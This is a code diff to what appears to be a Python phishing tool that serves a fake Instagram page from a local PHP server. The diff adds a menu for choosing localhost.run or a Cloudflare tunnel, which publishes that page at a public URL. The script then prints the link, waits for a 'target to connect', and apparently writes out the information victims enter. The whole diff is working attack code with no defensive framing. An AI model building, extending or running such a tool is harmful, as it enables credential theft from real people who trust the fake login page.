@@ -74,6 +74,13 @@ def loaclhost():
 
     with open("localhost.txt" , "w") as local:
         subprocess.Popen((f"ssh -R 80:localhost:{port} nokey@localhost.run"),stderr=local , stdout=local , shell=True)
+#build cloudflare host====================================================================================================
+def cloudfalre():
+    global port 
+    
+    with open("localhost.txt" , "w") as clu:
+        subprocess.Popen((f"cloudflared tunnel --url localhost:{port}"),stderr=clu , stdout=clu , shell=True)
+
 #smooth print====================================================================================================
 def Sprint(text):
   for character in text:
@@ -155,7 +162,14 @@ def instagram():
     os.chdir(rf"{path}/instagram")
 
 #====================================================================================================
+    print(f"""\n{Fore.RED}[{Fore.LIGHTWHITE_EX}1{Fore.RED}]{Fore.LIGHTWHITE_EX} Localhost.run\n
+{Fore.RED}[{Fore.LIGHTWHITE_EX}2{Fore.RED}]{Fore.LIGHTWHITE_EX} Cloudflare tunnel""" + Fore.RESET)
+
+    link = int(input(Fore.MAGENTA + "\nChoose your tunnel : " + Fore.RESET))
+    
     try:
+        
+        
         port = int(input(Fore.MAGENTA + f"\nWhich Port Want To Open {Fore.BLUE}({Fore.YELLOW}Default 80{Fore.BLUE}) {Fore.GREEN}⮞ " + Fore.RESET))
         if port > 65535:
             exit(f"""{Fore.YELLOW}│
@@ -176,26 +190,56 @@ def instagram():
     php_server()
     
     sleep(1)
-
-    loaclhost()
     
-    try:
-        print(" ")
-        rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
-    except KeyboardInterrupt:
-        exit(f"""\n{Fore.YELLOW}│
-╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+#Run Localhost.run====================================================================================================
+
+    if link == 1:
         
-    print("                          " , end="\r")
+        loaclhost()
+        
+        try:
+            print(" ")
+            rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
+        except KeyboardInterrupt:
+            exit(f"""\n{Fore.YELLOW}│
+    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+            
+        print("                          " , end="\r")
 #Generate Link====================================================================================================
 
-    line = linecache.getline(r"localhost.txt" , 24)
-    print(f"\r{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
-    sleep(0.1)
-    linecache.clearcache()
-    
-    Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
-    
+        line = linecache.getline(r"localhost.txt" , 24)
+        print(f"\r{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
+        sleep(0.1)
+        linecache.clearcache()
+        
+        Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
+        
+#Run Cloudflare====================================================================================================  
+    if link == 2:
+        
+        cloudfalre()
+        
+        try:
+            print(" ")
+            rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
+        except KeyboardInterrupt:
+            exit(f"""\n{Fore.YELLOW}│
+    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+            
+        print("                          " , end="\r")
+        
+#Generate Link====================================================================================================
+        line = linecache.getline(r"localhost.txt" , 5)
+        
+        line = line.split()
+        
+        print(f"{Fore.CYAN}Your URL : {Fore.LIGHTWHITE_EX}{line[3]}" + Fore.RESET)
+        
+        sleep(0.1)
+        linecache.clearcache()
+        
+        Sprint(Fore.YELLOW + "\n\rwaiting for target to connect...\n".title() + Fore.RESET)
+        
 #Write info====================================================================================================
     try:
         while True:
